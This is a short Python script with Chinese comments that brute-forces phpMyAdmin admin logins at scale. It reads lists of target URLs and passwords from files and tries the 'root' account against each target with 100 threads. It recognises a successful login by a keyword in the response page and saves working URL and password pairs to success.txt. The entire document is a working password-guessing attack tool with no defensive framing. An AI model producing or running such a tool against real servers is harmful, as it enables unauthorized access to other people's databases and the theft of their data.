# -*- coding:utf-8 -*-
#__author__:langzi
#__blog__:www.langzi.fun
import requests
from concurrent.futures import ThreadPoolExecutor
import time
def scan(url,passwords):
    '''
    接受传入网址和密码
    :param url: http://127.0.0.1/phpmyadmin/
    :param password: [root,12346,root1234]
    :return:
    '''
    for password in passwords:
        data = {'pma_username': 'root', 'pma_password': password}
        # 组成发送的数据包
        try:
            r = requests.post(url,data=data,timeout=20)
            print(f'当前爆破  网址 : {url} 用户名 : root : {password}')
            # 发起请求，尝试登陆
            if b'mainFrameset' in r.content:
                # 登陆成功后 ，页面会有 mainFrameset这个关键词
                print('爆破成功')
                with open('success.txt','a+')as a:
                    a.write(url+'|root|'+password+'\n')
                return
            # 成功的会保存到目录的success.txt文本中
            # 然后return的功能是退出函数
        except:
            pass

if __name__ == '__main__':
    urls = [x.strip() for x in open('urls.txt','r').readlines()]
    # urls 列表存储所有的phpmyadmin后台网址，
    # 从urls.txt中读取，所以把所有的phpmyadmin后台地址保存到urls.txt当中
    passwords = [x.strip() for x in open('passwords.txt','r').readlines()]
    # 密码保存在passwords.txt
    start_time = time.time()
    with ThreadPoolExecutor(100) as p:
        # 开启100个线程池
        for u in urls:
            p.submit(scan,u,passwords)
    print('总耗时:{}'.format(time.time()-start_time))